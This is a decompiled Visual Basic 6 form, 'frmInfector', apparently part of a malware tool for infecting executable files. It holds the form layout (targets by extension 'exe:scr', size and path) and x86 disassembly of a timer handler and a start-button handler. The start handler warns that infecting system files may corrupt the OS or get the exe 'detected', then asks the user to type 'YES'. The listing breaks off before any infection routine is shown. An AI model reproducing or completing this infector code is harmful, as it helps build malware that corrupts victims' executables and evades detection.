VERSION 5.00
Begin VB.Form frmInfector
  Caption = "Infector"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Icon = "frmInfector.frx":0
  LinkTopic = "Form1"
  ClientLeft = 225
  ClientTop = 555
  ClientWidth = 13290
  ClientHeight = 7065
  StartUpPosition = 2 'CenterScreen
  Begin XtremeSuiteControls.ListView lstInfector
    Left = 0
    Top = 0
    Width = 13215
    Height = 5655
    TabIndex = 0
  End
  Begin XtremeSuiteControls.GroupBox gbInfector
    Left = 0
    Top = 5760
    Width = 13215
    Height = 1215
    TabIndex = 1
    Begin VB.Timer tmrInfo
      Interval = 1000
      Left = 12720
      Top = 0
    End
    Begin VB.TextBox txtFileExt
      Left = 1440
      Top = 390
      Width = 1215
      Height = 285
      Text = "exe:scr"
      TabIndex = 3
      MaxLength = 255
    End
    Begin VB.TextBox txtFileSz
      Left = 4800
      Top = 390
      Width = 615
      Height = 285
      Text = "3"
      TabIndex = 2
      MaxLength = 4
    End
    Begin XtremeSuiteControls.ComboBox cmbSize
      Left = 5460
      Top = 360
      Width = 735
      Height = 315
      TabStop = 0   'False
      TabIndex = 4
    End
    Begin XtremeSuiteControls.ComboBox cmbTarget
      Left = 2640
      Top = 825
      Width = 1695
      Height = 315
      TabStop = 0   'False
      TabIndex = 5
    End
    Begin XtremeSuiteControls.PushButton cmdStart
      Left = 11880
      Top = 720
      Width = 1215
      Height = 375
      TabIndex = 13
    End
    Begin XtremeSuiteControls.PushButton cmdStop
      Left = 120
      Top = 720
      Width = 1215
      Height = 375
      TabIndex = 14
    End
    Begin VB.Label lblInfoSel
      Caption = "Selected targets:"
      Index = 0
      Left = 10920
      Top = 240
      Width = 1335
      Height = 255
      TabIndex = 16
      Alignment = 1 'Right Justify
      BackStyle = 0 'Transparent
    End
    Begin VB.Label lblInfoSel
      Caption = "N/A"
      Index = 1
      Left = 12360
      Top = 240
      Width = 735
      Height = 255
      TabIndex = 15
      BackStyle = 0 'Transparent
    End
    Begin VB.Label lblHijacker
      Caption = "File extension(s):"
      Index = 8
      Left = 120
      Top = 390
      Width = 1215
      Height = 255
      TabIndex = 12
    End
    Begin VB.Label lblHijacker
      Caption = "( * = Any)"
      Index = 9
      Left = 2760
      Top = 390
      Width = 735
      Height = 255
      TabIndex = 11
    End
    Begin VB.Label lblHijacker
      Caption = "Max file size:"
      Index = 10
      Left = 3720
      Top = 390
      Width = 975
      Height = 255
      TabIndex = 10
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblHijacker
      Caption = "(0 = Any)"
      Index = 11
      Left = 6360
      Top = 390
      Width = 735
      Height = 255
      TabIndex = 9
    End
    Begin VB.Label lblHijacker
      Caption = "Target path:"
      Index = 14
      Left = 1560
      Top = 870
      Width = 975
      Height = 255
      TabIndex = 8
      Alignment = 1 'Right Justify
    End
    Begin VB.Label lblCustomTarget
      Caption = "Custom path:"
      Left = 4560
      Top = 870
      Width = 975
      Height = 255
      TabIndex = 7
    End
    Begin VB.Label lblCustomPath
      Caption = "N/A"
      Left = 5640
      Top = 870
      Width = 5535
      Height = 255
      TabIndex = 6
    End
  End
  Begin VB.Menu mnuInfectorMenu
    Visible = 0   'False
    Caption = "Menu"
    Begin VB.Menu mnuInfector
      Index = 0
      Caption = "Get report"
    End
    Begin VB.Menu mnuInfector
      Index = 1
      Caption = "Clear finished"
    End
    Begin VB.Menu mnuInfector
      Index = 2
      Caption = "-"
    End
    Begin VB.Menu mnuInfector
      Index = 3
      Caption = "Copy"
    End
    Begin VB.Menu mnuInfector
      Index = 4
      Caption = "Save to file"
    End
    Begin VB.Menu mnuInfector
      Index = 5
      Caption = "-"
    End
    Begin VB.Menu mnuInfector
      Index = 6
      Caption = "Clear all"
    End
  End
End

Attribute VB_Name = "frmInfector"


Private sub tmrInfo__86FB1F
0086FB1F: push ebp
0086FB20: mov ebp, esp
0086FB22: sub esp, 0000000Ch
0086FB25: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086FB2A: mov eax, fs:[00h]
0086FB30: push eax
0086FB31: mov fs:[00000000h], esp
0086FB38: mov eax, 000000B0h
0086FB3D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086FB42: push ebx
0086FB43: push esi
0086FB44: push edi
0086FB45: mov var_0C, esp
0086FB48: mov var_08, 0040D1C8h
0086FB4F: mov eax, [ebp+08h]
0086FB52: and eax, 00000001h
0086FB55: mov var_04, eax
0086FB58: mov eax, [ebp+08h]
0086FB5B: and al, FEh
0086FB5D: mov [ebp+08h], eax
0086FB60: mov eax, [ebp+08h]
0086FB63: mov eax, [eax]
0086FB65: push [ebp+08h]
0086FB68: call [eax+04h]
0086FB6B: movsx eax, word ptr [8F2430h]
0086FB72: test eax, eax
0086FB74: jnz 0086FE60h
0086FB7A: cmp [008F2010h], 00000000h
0086FB81: jnz 86FB9Eh
0086FB83: push 008F2010h
0086FB88: push 00433984h
0086FB8D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086FB92: mov var_000000A8, 008F2010h
0086FB9C: jmp 86FBA8h
0086FB9E: mov var_000000A8, 008F2010h
0086FBA8: push 00000000h
0086FBAA: push 00000001h
0086FBAC: push 00440E48h
0086FBB1: push 00000000h
0086FBB3: push 00000018h
0086FBB5: mov eax, var_000000A8
0086FBBB: mov eax, [eax]
0086FBBD: mov ecx, var_000000A8
0086FBC3: mov ecx, [ecx]
0086FBC5: mov ecx, [ecx]
0086FBC7: push eax
0086FBC8: call [ecx+00000550h]
0086FBCE: push eax
0086FBCF: lea eax, var_24
0086FBD2: push eax
0086FBD3: call 00410A84h ; Set (object)
0086FBD8: push eax
0086FBD9: lea eax, var_3C
0086FBDC: push eax
0086FBDD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FBE2: add esp, 00000010h
0086FBE5: push eax
0086FBE6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086FBEB: push eax
0086FBEC: lea eax, var_28
0086FBEF: push eax
0086FBF0: call 00410A84h ; Set (object)
0086FBF5: push eax
0086FBF6: lea eax, var_4C
0086FBF9: push eax
0086FBFA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FBFF: add esp, 00000010h
0086FC02: push eax
0086FC03: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086FC08: xor ecx, ecx
0086FC0A: test eax, eax
0086FC0C: setnle cl
0086FC0F: neg ecx
0086FC11: mov var_80, cx
0086FC15: lea eax, var_28
0086FC18: push eax
0086FC19: lea eax, var_24
0086FC1C: push eax
0086FC1D: push 00000002h
0086FC1F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086FC24: add esp, 0000000Ch
0086FC27: lea eax, var_4C
0086FC2A: push eax
0086FC2B: lea eax, var_3C
0086FC2E: push eax
0086FC2F: push 00000002h
0086FC31: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FC36: add esp, 0000000Ch
0086FC39: movsx eax, word ptr var_80
0086FC3D: test eax, eax
0086FC3F: jz 0086FE5Bh
0086FC45: cmp [008F2010h], 00000000h
0086FC4C: jnz 86FC69h
0086FC4E: push 008F2010h
0086FC53: push 00433984h
0086FC58: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086FC5D: mov var_000000AC, 008F2010h
0086FC67: jmp 86FC73h
0086FC69: mov var_000000AC, 008F2010h
0086FC73: push 00000000h
0086FC75: push 00000001h
0086FC77: push 00440E48h
0086FC7C: push 00000000h
0086FC7E: push 00000018h
0086FC80: mov eax, var_000000AC
0086FC86: mov eax, [eax]
0086FC88: mov ecx, var_000000AC
0086FC8E: mov ecx, [ecx]
0086FC90: mov ecx, [ecx]
0086FC92: push eax
0086FC93: call [ecx+00000550h]
0086FC99: push eax
0086FC9A: lea eax, var_24
0086FC9D: push eax
0086FC9E: call 00410A84h ; Set (object)
0086FCA3: push eax
0086FCA4: lea eax, var_3C
0086FCA7: push eax
0086FCA8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FCAD: add esp, 00000010h
0086FCB0: push eax
0086FCB1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086FCB6: push eax
0086FCB7: lea eax, var_28
0086FCBA: push eax
0086FCBB: call 00410A84h ; Set (object)
0086FCC0: push eax
0086FCC1: lea eax, var_4C
0086FCC4: push eax
0086FCC5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FCCA: add esp, 00000010h
0086FCCD: push eax
0086FCCE: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086FCD3: mov var_00000094, eax
0086FCD9: mov var_00000090, 00000001h
0086FCE3: mov var_18, 00000001h
0086FCEA: lea eax, var_28
0086FCED: push eax
0086FCEE: lea eax, var_24
0086FCF1: push eax
0086FCF2: push 00000002h
0086FCF4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086FCF9: add esp, 0000000Ch
0086FCFC: lea eax, var_4C
0086FCFF: push eax
0086FD00: lea eax, var_3C
0086FD03: push eax
0086FD04: push 00000002h
0086FD06: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FD0B: add esp, 0000000Ch
0086FD0E: jmp 86FD22h
0086FD10: mov eax, var_18
0086FD13: add eax, var_00000090
0086FD19: jo 00870271h
0086FD1F: mov var_18, eax
0086FD22: mov eax, var_18
0086FD25: cmp eax, var_00000094
0086FD2B: jnle 0086FE5Bh
0086FD31: mov eax, var_18
0086FD34: mov var_64, eax
0086FD37: mov var_6C, 00000003h
0086FD3E: cmp [008F2010h], 00000000h
0086FD45: jnz 86FD62h
0086FD47: push 008F2010h
0086FD4C: push 00433984h
0086FD51: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086FD56: mov var_000000B0, 008F2010h
0086FD60: jmp 86FD6Ch
0086FD62: mov var_000000B0, 008F2010h
0086FD6C: push 00000000h
0086FD6E: push 00000004h
0086FD70: push 00440E58h
0086FD75: push 00000010h
0086FD77: pop eax
0086FD78: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086FD7D: lea esi, var_6C
0086FD80: mov edi, esp
0086FD82: movsd 
0086FD83: movsd 
0086FD84: movsd 
0086FD85: movsd 
0086FD86: push 00000001h
0086FD88: push 00000000h
0086FD8A: push 00440E48h
0086FD8F: push 00000000h
0086FD91: push 00000018h
0086FD93: mov eax, var_000000B0
0086FD99: mov eax, [eax]
0086FD9B: mov ecx, var_000000B0
0086FDA1: mov ecx, [ecx]
0086FDA3: mov ecx, [ecx]
0086FDA5: push eax
0086FDA6: call [ecx+00000550h]
0086FDAC: push eax
0086FDAD: lea eax, var_24
0086FDB0: push eax
0086FDB1: call 00410A84h ; Set (object)
0086FDB6: push eax
0086FDB7: lea eax, var_3C
0086FDBA: push eax
0086FDBB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FDC0: add esp, 00000010h
0086FDC3: push eax
0086FDC4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086FDC9: push eax
0086FDCA: lea eax, var_28
0086FDCD: push eax
0086FDCE: call 00410A84h ; Set (object)
0086FDD3: push eax
0086FDD4: lea eax, var_4C
0086FDD7: push eax
0086FDD8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FDDD: add esp, 00000020h
0086FDE0: push eax
0086FDE1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086FDE6: push eax
0086FDE7: lea eax, var_2C
0086FDEA: push eax
0086FDEB: call 00410A84h ; Set (object)
0086FDF0: push eax
0086FDF1: lea eax, var_5C
0086FDF4: push eax
0086FDF5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FDFA: add esp, 00000010h
0086FDFD: push eax
0086FDFE: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0086FE03: sub ax, FFFFh
0086FE07: neg ax
0086FE0A: sbb eax, eax
0086FE0C: inc eax
0086FE0D: neg eax
0086FE0F: mov var_80, ax
0086FE13: lea eax, var_2C
0086FE16: push eax
0086FE17: lea eax, var_28
0086FE1A: push eax
0086FE1B: lea eax, var_24
0086FE1E: push eax
0086FE1F: push 00000003h
0086FE21: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086FE26: add esp, 00000010h
0086FE29: lea eax, var_5C
0086FE2C: push eax
0086FE2D: lea eax, var_4C
0086FE30: push eax
0086FE31: lea eax, var_3C
0086FE34: push eax
0086FE35: push 00000003h
0086FE37: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FE3C: add esp, 00000010h
0086FE3F: movsx eax, word ptr var_80
0086FE43: test eax, eax
0086FE45: jz 86FE56h
0086FE47: mov eax, var_1C
0086FE4A: add eax, 00000001h
0086FE4D: jo 00870271h
0086FE53: mov var_1C, eax
0086FE56: jmp 0086FD10h
0086FE5B: jmp 0087012Eh
0086FE60: cmp [008F2010h], 00000000h
0086FE67: jnz 86FE84h
0086FE69: push 008F2010h
0086FE6E: push 00433984h
0086FE73: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086FE78: mov var_000000B4, 008F2010h
0086FE82: jmp 86FE8Eh
0086FE84: mov var_000000B4, 008F2010h
0086FE8E: and var_64, 00000000h
0086FE92: mov var_6C, 00008002h
0086FE99: push 00000000h
0086FE9B: push 0044A9C8h ; COUNT
0086FEA0: push 00000000h
0086FEA2: push 0044A9B0h ; lstFiltered
0086FEA7: mov eax, var_000000B4
0086FEAD: mov eax, [eax]
0086FEAF: mov ecx, var_000000B4
0086FEB5: mov ecx, [ecx]
0086FEB7: mov ecx, [ecx]
0086FEB9: push eax
0086FEBA: call [ecx+00000550h]
0086FEC0: push eax
0086FEC1: lea eax, var_24
0086FEC4: push eax
0086FEC5: call 00410A84h ; Set (object)
0086FECA: push eax
0086FECB: lea eax, var_3C
0086FECE: push eax
0086FECF: call 00410742h ; msvbvm60.dll.__vbaLateMemCallLd
0086FED4: add esp, 00000010h
0086FED7: push eax
0086FED8: lea eax, var_4C
0086FEDB: push eax
0086FEDC: call 004107D8h ; msvbvm60.dll.__vbaVarLateMemCallLd
0086FEE1: add esp, 00000010h
0086FEE4: push eax
0086FEE5: lea eax, var_6C
0086FEE8: push eax
0086FEE9: call 0041091Ch ; msvbvm60.dll.__vbaVarTstGt
0086FEEE: mov var_80, ax
0086FEF2: lea ecx, var_24
0086FEF5: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0086FEFA: lea eax, var_4C
0086FEFD: push eax
0086FEFE: lea eax, var_3C
0086FF01: push eax
0086FF02: push 00000002h
0086FF04: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FF09: add esp, 0000000Ch
0086FF0C: movsx eax, word ptr var_80
0086FF10: test eax, eax
0086FF12: jz 0087012Eh
0086FF18: cmp [008F2010h], 00000000h
0086FF1F: jnz 86FF3Ch
0086FF21: push 008F2010h
0086FF26: push 00433984h
0086FF2B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086FF30: mov var_000000B8, 008F2010h
0086FF3A: jmp 86FF46h
0086FF3C: mov var_000000B8, 008F2010h
0086FF46: push 00000000h
0086FF48: push 00000001h
0086FF4A: push 00440E48h
0086FF4F: push 00000000h
0086FF51: push 00000018h
0086FF53: mov eax, var_000000B8
0086FF59: mov eax, [eax]
0086FF5B: mov ecx, var_000000B8
0086FF61: mov ecx, [ecx]
0086FF63: mov ecx, [ecx]
0086FF65: push eax
0086FF66: call [ecx+0000054Ch]
0086FF6C: push eax
0086FF6D: lea eax, var_24
0086FF70: push eax
0086FF71: call 00410A84h ; Set (object)
0086FF76: push eax
0086FF77: lea eax, var_3C
0086FF7A: push eax
0086FF7B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FF80: add esp, 00000010h
0086FF83: push eax
0086FF84: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086FF89: push eax
0086FF8A: lea eax, var_28
0086FF8D: push eax
0086FF8E: call 00410A84h ; Set (object)
0086FF93: push eax
0086FF94: lea eax, var_4C
0086FF97: push eax
0086FF98: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086FF9D: add esp, 00000010h
0086FFA0: push eax
0086FFA1: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086FFA6: mov var_0000009C, eax
0086FFAC: mov var_00000098, 00000001h
0086FFB6: mov var_18, 00000001h
0086FFBD: lea eax, var_28
0086FFC0: push eax
0086FFC1: lea eax, var_24
0086FFC4: push eax
0086FFC5: push 00000002h
0086FFC7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086FFCC: add esp, 0000000Ch
0086FFCF: lea eax, var_4C
0086FFD2: push eax
0086FFD3: lea eax, var_3C
0086FFD6: push eax
0086FFD7: push 00000002h
0086FFD9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FFDE: add esp, 0000000Ch
0086FFE1: jmp 86FFF5h
0086FFE3: mov eax, var_18
0086FFE6: add eax, var_00000098
0086FFEC: jo 00870271h
0086FFF2: mov var_18, eax
0086FFF5: mov eax, var_18
0086FFF8: cmp eax, var_0000009C
0086FFFE: jnle 0087012Eh
00870004: mov eax, var_18
00870007: mov var_64, eax
0087000A: mov var_6C, 00000003h
00870011: cmp [008F2010h], 00000000h
00870018: jnz 870035h
0087001A: push 008F2010h
0087001F: push 00433984h
00870024: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00870029: mov var_000000BC, 008F2010h
00870033: jmp 87003Fh
00870035: mov var_000000BC, 008F2010h
0087003F: push 00000000h
00870041: push 00000004h
00870043: push 00440E58h
00870048: push 00000010h
0087004A: pop eax
0087004B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00870050: lea esi, var_6C
00870053: mov edi, esp
00870055: movsd 
00870056: movsd 
00870057: movsd 
00870058: movsd 
00870059: push 00000001h
0087005B: push 00000000h
0087005D: push 00440E48h
00870062: push 00000000h
00870064: push 00000018h
00870066: mov eax, var_000000BC
0087006C: mov eax, [eax]
0087006E: mov ecx, var_000000BC
00870074: mov ecx, [ecx]
00870076: mov ecx, [ecx]
00870078: push eax
00870079: call [ecx+0000054Ch]
0087007F: push eax
00870080: lea eax, var_24
00870083: push eax
00870084: call 00410A84h ; Set (object)
00870089: push eax
0087008A: lea eax, var_3C
0087008D: push eax
0087008E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00870093: add esp, 00000010h
00870096: push eax
00870097: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0087009C: push eax
0087009D: lea eax, var_28
008700A0: push eax
008700A1: call 00410A84h ; Set (object)
008700A6: push eax
008700A7: lea eax, var_4C
008700AA: push eax
008700AB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008700B0: add esp, 00000020h
008700B3: push eax
008700B4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008700B9: push eax
008700BA: lea eax, var_2C
008700BD: push eax
008700BE: call 00410A84h ; Set (object)
008700C3: push eax
008700C4: lea eax, var_5C
008700C7: push eax
008700C8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008700CD: add esp, 00000010h
008700D0: push eax
008700D1: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008700D6: sub ax, FFFFh
008700DA: neg ax
008700DD: sbb eax, eax
008700DF: inc eax
008700E0: neg eax
008700E2: mov var_80, ax
008700E6: lea eax, var_2C
008700E9: push eax
008700EA: lea eax, var_28
008700ED: push eax
008700EE: lea eax, var_24
008700F1: push eax
008700F2: push 00000003h
008700F4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008700F9: add esp, 00000010h
008700FC: lea eax, var_5C
008700FF: push eax
00870100: lea eax, var_4C
00870103: push eax
00870104: lea eax, var_3C
00870107: push eax
00870108: push 00000003h
0087010A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087010F: add esp, 00000010h
00870112: movsx eax, word ptr var_80
00870116: test eax, eax
00870118: jz 870129h
0087011A: mov eax, var_1C
0087011D: add eax, 00000001h
00870120: jo 00870271h
00870126: mov var_1C, eax
00870129: jmp 0086FFE3h
0087012E: mov eax, [ebp+08h]
00870131: mov eax, [eax]
00870133: push [ebp+08h]
00870136: call [eax+00000308h]
0087013C: push eax
0087013D: lea eax, var_24
00870140: push eax
00870141: call 00410A84h ; Set (object)
00870146: mov var_80, eax
00870149: lea eax, var_28
0087014C: push eax
0087014D: push 00000001h
0087014F: mov eax, var_80
00870152: mov eax, [eax]
00870154: push var_80
00870157: call [eax+40h]
0087015A: fclex 
0087015C: mov var_00000084, eax
00870162: cmp var_00000084, 00000000h
00870169: jnl 870188h
0087016B: push 00000040h
0087016D: push 00440DE8h
00870172: push var_80
00870175: push var_00000084
0087017B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00870180: mov var_000000C0, eax
00870186: jmp 87018Fh
00870188: and var_000000C0, 00000000h
0087018F: mov eax, var_28
00870192: mov var_00000088, eax
00870198: push var_1C
0087019B: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008701A0: mov edx, eax
008701A2: lea ecx, var_20
008701A5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008701AA: push eax
008701AB: mov eax, var_00000088
008701B1: mov eax, [eax]
008701B3: push var_00000088
008701B9: call [eax+54h]
008701BC: fclex 
008701BE: mov var_0000008C, eax
008701C4: cmp var_0000008C, 00000000h
008701CB: jnl 8701EDh
008701CD: push 00000054h
008701CF: push 004425E4h
008701D4: push var_00000088
008701DA: push var_0000008C
008701E0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008701E5: mov var_000000C4, eax
008701EB: jmp 8701F4h
008701ED: and var_000000C4, 00000000h
008701F4: lea ecx, var_20
008701F7: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008701FC: lea eax, var_28
008701FF: push eax
00870200: lea eax, var_24
00870203: push eax
00870204: push 00000002h
00870206: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087020B: add esp, 0000000Ch
0087020E: mov var_04, 00000000h
00870215: push 00870252h
0087021A: jmp 870251h
0087021C: lea ecx, var_20
0087021F: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00870224: lea eax, var_2C
00870227: push eax
00870228: lea eax, var_28
0087022B: push eax
0087022C: lea eax, var_24
0087022F: push eax
00870230: push 00000003h
00870232: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00870237: add esp, 00000010h
0087023A: lea eax, var_5C
0087023D: push eax
0087023E: lea eax, var_4C
00870241: push eax
00870242: lea eax, var_3C
00870245: push eax
00870246: push 00000003h
00870248: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0087024D: add esp, 00000010h
00870250: ret 
End Sub

Private sub cmdStart__867D24
00867D24: push ebp
00867D25: mov ebp, esp
00867D27: sub esp, 0000000Ch
00867D2A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00867D2F: mov eax, fs:[00h]
00867D35: push eax
00867D36: mov fs:[00000000h], esp
00867D3D: mov eax, 00000278h
00867D42: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00867D47: push ebx
00867D48: push esi
00867D49: push edi
00867D4A: mov var_0C, esp
00867D4D: mov var_08, 0040D070h
00867D54: mov eax, [ebp+08h]
00867D57: and eax, 00000001h
00867D5A: mov var_04, eax
00867D5D: mov eax, [ebp+08h]
00867D60: and al, FEh
00867D62: mov [ebp+08h], eax
00867D65: mov eax, [ebp+08h]
00867D68: mov eax, [eax]
00867D6A: push [ebp+08h]
00867D6D: call [eax+04h]
00867D70: mov var_000000C4, 80020004h
00867D7A: mov var_000000CC, 0000000Ah
00867D84: mov var_000000B4, 80020004h
00867D8E: mov var_000000BC, 0000000Ah
00867D98: mov var_000000A4, 80020004h
00867DA2: mov var_000000AC, 0000000Ah
00867DAC: mov var_00000094, 80020004h
00867DB6: mov var_0000009C, 0000000Ah
00867DC0: mov var_00000084, 80020004h
00867DCA: mov var_0000008C, 0000000Ah
00867DD4: mov var_74, 80020004h
00867DDB: mov var_7C, 0000000Ah
00867DE2: push 00456E4Ch ; Using this in the home or root directory can be very dangerous.
00867DE7: push 00441264h ; vbCrLf
00867DEC: call 00410A18h ; &
00867DF1: mov edx, eax
00867DF3: lea ecx, var_38
00867DF6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00867DFB: push eax
00867DFC: push 00456F88h ; Infecting system files can cause the operating system to corrupt, and mass corrupting files may cause problems if the exe becomes detected.
00867E01: call 00410A18h ; &
00867E06: mov edx, eax
00867E08: lea ecx, var_3C
00867E0B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00867E10: push eax
00867E11: push 00455E24h ; In order to continue, please type "YES"
00867E16: call 00410A18h ; &
00867E1B: mov var_64, eax
00867E1E: mov var_6C, 00000008h
00867E25: lea eax, var_000000CC
00867E2B: push eax
00867E2C: lea eax, var_000000BC
00867E32: push eax
00867E33: lea eax, var_000000AC
00867E39: push eax
00867E3A: lea eax, var_0000009C
00867E40: push eax
00867E41: lea eax, var_0000008C
00867E47: push eax
00867E48: lea eax, var_7C
00867E4B: push eax
00867E4C: lea eax, var_6C
00867E4F: push eax
00867E50: call 00410994h ; InputBox
00867E55: mov var_000000D4, eax
00867E5B: mov var_000000DC, 00000008h
00867E65: lea eax, var_000000DC
00867E6B: push eax
00867E6C: lea eax, var_000000EC
00867E72: push eax
00867E73: call 00410856h ; LCase(arg_1)
00867E78: mov var_00000178, 00455E78h ; yes
00867E82: mov var_00000180, 00008008h
00867E8C: lea eax, var_000000EC
00867E92: push eax
00867E93: lea eax, var_00000180
00867E99: push eax
00867E9A: lea eax, var_000000FC
00867EA0: push eax
00867EA1: call 00410766h ; msvbvm60.dll.__vbaVarCmpEq
00867EA6: push eax
00867EA7: lea eax, var_0000010C
00867EAD: push eax
00867EAE: call 00410C88h ; Not
00867EB3: push eax
00867EB4: call 00410910h ; msvbvm60.dll.__vbaBoolVarNull
00867EB9: mov var_0000019C, ax
00867EC0: lea eax, var_3C
00867EC3: push eax
00867EC4: lea eax, var_38
00867EC7: push eax
00867EC8: push 00000002h
00867ECA: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00867ECF: add esp, 0000000Ch
00867ED2: lea eax, var_000000EC
00867ED8: push eax
00867ED9: lea eax, var_000000DC
00867EDF: push eax
00867EE0: lea eax, var_000000CC
00867EE6: push eax
00867EE7: lea eax, var_000000BC
00867EED: push eax
00867EEE: lea eax, var_000000AC
00867EF4: push eax
00867EF5: lea eax, var_0000009C
00867EFB: push eax
00867EFC: lea eax, var_0000008C
00867F02: push eax
00867F03: lea eax, var_7C
00867F06: push eax
00867F07: lea eax, var_6C
00867F0A: push eax
00867F0B: push 00000009h
00867F0D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00867F12: add esp, 00000028h
00867F15: movsx eax, word ptr var_0000019C
00867F1C: test eax, eax
00867F1E: jz 00867FBEh
00867F24: mov var_00000094, 80020004h
00867F2E: mov var_0000009C, 0000000Ah
00867F38: mov var_00000084, 80020004h
00867F42: mov var_0000008C, 0000000Ah
00867F4C: mov var_74, 80020004h
00867F53: mov var_7C, 0000000Ah
00867F5A: mov var_00000118, 00455E84h ; Task aborted by user! (invalid confirmation code)
00867F64: mov var_00000120, 00000008h
00867F6E: lea edx, var_00000120
00867F74: lea ecx, var_6C
00867F77: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00867F7C: lea eax, var_0000009C
00867F82: push eax
00867F83: lea eax, var_0000008C
00867F89: push eax
00867F8A: lea eax, var_7C
00867F8D: push eax
00867F8E: push 00000030h
00867F90: lea eax, var_6C
00867F93: push eax
00867F94: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
00867F99: lea eax, var_0000009C
00867F9F: push eax
00867FA0: lea eax, var_0000008C
00867FA6: push eax
00867FA7: lea eax, var_7C
00867FAA: push eax
00867FAB: lea eax, var_6C
00867FAE: push eax
00867FAF: push 00000004h
00867FB1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00867FB6: add esp, 00000014h
00867FB9: jmp 0086AD9Fh
00867FBE: push 00000000h
00867FC0: push 00000000h
00867FC2: mov eax, [ebp+08h]
00867FC5: mov eax, [eax]
00867FC7: push [ebp+08h]
00867FCA: call [eax+00000328h]
00867FD0: push eax
00867FD1: lea eax, var_40
00867FD4: push eax
00867FD5: call 00410A84h ; Set (object)
00867FDA: push eax
00867FDB: lea eax, var_6C
00867FDE: push eax
00867FDF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00867FE4: add esp, 00000010h
00867FE7: push eax
00867FE8: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00867FED: mov edx, eax
00867FEF: lea ecx, var_000001A4
00867FF5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00867FFA: lea ecx, var_40
00867FFD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00868002: lea ecx, var_6C
00868005: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086800A: push var_000001A4
00868010: push 00447A84h
00868015: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0086801A: test eax, eax
0086801C: jnz 008680B3h
00868022: mov eax, [ebp+08h]
00868025: mov eax, [eax]
00868027: push [ebp+08h]
0086802A: call [eax+00000304h]
00868030: push eax
00868031: lea eax, var_40
00868034: push eax
00868035: call 00410A84h ; Set (object)
0086803A: mov var_0000019C, eax
00868040: lea eax, var_38
00868043: push eax
00868044: mov eax, var_0000019C
0086804A: mov eax, [eax]
0086804C: push var_0000019C
00868052: call [eax+000000A0h]
00868058: fclex 
0086805A: mov var_000001A0, eax
00868060: cmp var_000001A0, 00000000h
00868067: jnl 86808Ch
00868069: push 000000A0h
0086806E: push 00440E08h
00868073: push var_0000019C
00868079: push var_000001A0
